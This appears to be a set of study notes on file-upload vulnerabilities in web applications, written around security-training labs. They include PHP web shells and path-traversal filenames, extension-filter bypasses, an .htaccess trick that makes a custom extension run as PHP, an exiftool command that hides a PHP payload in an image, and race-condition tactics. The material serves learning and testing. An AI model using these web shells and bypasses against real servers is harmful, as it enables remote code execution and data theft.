> Tip: 
> The Content-Type response header may provide clues as to what kind of file the server thinks it has served. If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping.

## Upload file with the name that already exists
If the filename isn't validated properly, this could allow an attacker to overwrite critical files simply by uploading a file with the same name. If the server is also vulnerable to directory traversal, this could mean attackers are even able to upload files to unanticipated locations

## Fail in validation of filesize may lead to DoS attack

## File validation may be different for different endpoints

## Server is not configured to execute executable file may result in revealing  the source code 
If the file type is executable, but the server is not configured to execute files of this type, it will generally respond with an error. However, in some cases, the contents of the file may still be served to the client as plain text. Such misconfigurations can occasionally be exploited to leak source code and other sensitive information. You can see an example of this in our information disclosure learning materials. 

## Remote code execution via web shell upload
```bash
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
Another example:  
GET /example/exploit.php?command=id HTTP/1.1
```bash
<?php echo system($_GET['command']); ?>
```

## Web shell upload via Content-Type restriction bypass
Change Content-Type: to image/jpeg in the appropriate part of the req.body


## Web shell upload via path traversal
A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all.

Web servers often use the filename field in multipart/form-data requests to determine the name and location where the file should be saved. 

Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
OR sometime it may not work so we may need to obfuscate it:
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"

## Insufficient blacklisting of dangerous file types
Blacklists can sometimes be bypassed by using lesser known, alternative file extensions that may still be executable, such as .php5, .shtml, and so on. 

## Web shell upload via extension blacklist bypass
For example, before an Apache server will execute PHP files requested by a client, developers might have to add the following directives to their `/etc/apache2/apache2.conf` file: 
```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
    AddType application/x-httpd-php .php
```

Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. Apache servers, for example, will load a directory-specific configuration from a file called `.htaccess` if one is present.  

Similarly, developers can make directory-specific configuration on IIS servers using a `web.config` file. This might include directives such as the following, which in this case allows JSON files to be served to users: 
```
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```

You may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable MIME type. 

Solution:
```
Change filename parameter to .htaccess
Content-Type header to text/plain
replace the contents of my php file to the following:
AddType application/x-httpd-php .aaa
```

## File filters can be circumvented/Obfuscated
Case sensitive  
`exploit.pHp is in fact a .php file`  
Let's say the validation code is case sensitive and fails to recognize that 
exploit.pHp is in fact a .php file

Multiple extensions  
`exploit.php.jpg`  
Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or JPG image

Trailing chars  
`exploit.php.`  
Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: 

Url encode or double url encode  
`exploit%2Ephp`  
Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked

Add semicolons or URL-encoded null byte characters before the file extension  
`exploit.asp;.jpg or exploit.asp%00.jpg`  
If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename

Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.

Stripping forbidden chars:  
`exploit.p.phphp`  
Other defenses involve stripping or replacing dangerous extensions to prevent the file from being executed. If this transformation isn't applied recursively, you can position the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider what happens if you strip .php from the following filename

*__This is just a small selection of the many ways it's possible to obfuscate file extensions.__* 

## Flawed validation of the file's contents
Certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes `FF D8 FF`

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" rr.png-o ha.php
```
This adds your PHP payload to the image's Comment field, then saves the image with a .php extension.

## Exploiting file upload race conditions
Modern frameworks don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so.

For example, some websites upload the file directly to the main filesystem and then remove it again if it doesn't pass validation. This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware.
This may only take a few milliseconds, but for the short time that the file exists on the server, the attacker can potentially still execute it. 

i.e. we can simply create a file:with the following contents:
```bash
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
and upload it together with other requests

## Race conditions in URL-based file uploads

Similar race conditions can occur in functions that allow you to upload a file by providing a URL. In this case, the server has to fetch the file over the internet and create a local copy before it can perform any validation.

As the file is loaded using HTTP, developers are unable to use their framework's built-in mechanisms for securely validating files. Instead, they may manually create their own processes for temporarily storing and validating the file, which may not be quite as secure.

For example, if the file is loaded into a temporary directory with a randomized name, in theory, it should be impossible for an attacker to exploit any race conditions. If they don't know the name of the directory, they will be unable to request the file in order to trigger its execution. On the other hand, if the randomized directory name is generated using pseudo-random functions like PHP's uniqid(), it can potentially be brute-forced.

To make attacks like this easier, you can try to extend the amount of time taken to process the file, thereby lengthening the window for brute-forcing the directory name. One way of doing this is by uploading a larger file. If it is processed in chunks, you can potentially take advantage of this by creating a malicious file with the payload at the start, followed by a large number of arbitrary padding bytes. 

## Exploiting vulnerabilities in the parsing of uploaded files
If the uploaded file seems to be both stored and served securely, the last resort is to try exploiting vulnerabilities specific to the parsing or processing of different file formats. For example, you know that the server parses XML-based files, such as Microsoft Office `.doc` or `.xls` files, this may be a potential vector for XXE injection attacks. 

## Uploading files using PUT
It's worth noting that some web servers may be configured to support PUT requests. If appropriate defenses aren't in place, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface. 

Tip:
You can try sending `OPTIONS` requests to different endpoints to test for any that advertise support for the `PUT` method. 

